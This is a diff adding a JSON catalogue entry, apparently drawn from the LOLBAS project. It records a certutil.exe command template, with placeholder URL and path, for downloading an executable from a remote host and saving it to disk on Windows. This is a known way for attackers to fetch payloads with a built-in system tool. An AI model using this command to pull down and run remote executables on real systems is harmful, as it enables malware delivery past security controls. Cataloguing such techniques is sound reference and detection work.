@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-certutil-exe-download-1",
+  "name": "LOLBAS · Certutil.exe (Download) #1",
+  "command": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}",
+  "description": "Download and save an executable to disk in the current folder.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "certutil",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Certutil/",
+  "upstream_id": "Certutil.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Certutil.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Certutil/"
+    }
+  ]
+}
